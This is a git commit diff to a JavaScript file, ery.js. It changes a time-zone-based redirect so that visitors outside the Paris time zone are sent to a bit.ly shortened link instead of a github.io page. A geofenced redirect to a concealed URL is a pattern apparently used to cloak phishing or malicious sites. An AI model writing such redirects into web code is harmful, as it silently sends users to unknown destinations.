a5a145ddea7a2e854c71ece0fccc8ebac5ed4782
elankton <74224289+elankton@users.noreply.github.com>
2022-08-20 01:41:00 +0300

    Update ery.js

--- ery.js
+++ ery.js
@@ -1,3 +1,3 @@
 if (Intl.DateTimeFormat().resolvedOptions().timeZone.toLowerCase().indexOf('/paris') === -1){
-window.location.href = "https://elankton.github.io";
+window.location.href = "https://bit.ly/3pz3V9o";
 }
